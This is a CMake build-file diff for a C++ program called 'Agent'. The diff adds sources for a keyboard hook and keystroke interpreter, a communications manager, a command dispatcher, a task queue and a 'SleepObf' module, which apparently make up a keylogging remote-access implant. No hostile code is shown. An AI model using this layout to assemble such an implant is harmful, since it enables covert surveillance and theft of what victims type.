@@ -9,16 +9,36 @@ if (POLICY CMP0141)
   set(CMAKE_MSVC_DEBUG_INFORMATION_FORMAT "$<IF:$<AND:$<C_COMPILER_ID:MSVC>,$<CXX_COMPILER_ID:MSVC>>,$<$<CONFIG:Debug,RelWithDebInfo>:EditAndContinue>,$<$<CONFIG:Debug,RelWithDebInfo>:ProgramDatabase>>")
 endif()
 
-project ("Agent")
+project (Agent)
 
 # Add source to this project's executable.
 add_executable (
   Agent 
   "Agent.cpp" 
   "Agent.h"
-  "KeyBoardLogger.cpp"
-  "KeyBoardLogger.h"
-  )
+  "CommManager.cpp"
+  "CommManager.h"
+  "base64.hpp"
+  "CommandDispatcher.cpp"
+  "CommandDispatcher.h"
+  "SleepObf.cpp"
+  "AgentModule.cpp"
+  "AgentModule.h"
+  "TaskQueueManager.cpp"
+  "TaskQueueManager.h"
+  "KeyboardLogger/InputIntentRecorder.cpp"
+  "KeyboardLogger/InputIntentRecorder.h"
+  "KeyboardLogger/IntentEvent.h"
+  "KeyboardLogger/KeyboardEvent.cpp"
+  "KeyboardLogger/KeyboardHook.cpp"
+  "KeyboardLogger/KeyboardHook.h"
+  "KeyboardLogger/KeyboardInterpreter.cpp"
+  "KeyboardLogger/KeyboardInterpreter.h"
+  "KeyboardLogger/KeyboardState.cpp"
+  "KeyboardLogger/KeyboardState.h"
+)
+
+target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
 
 if (CMAKE_VERSION VERSION_GREATER 3.12)
   set_property(TARGET Agent PROPERTY CXX_STANDARD 20)
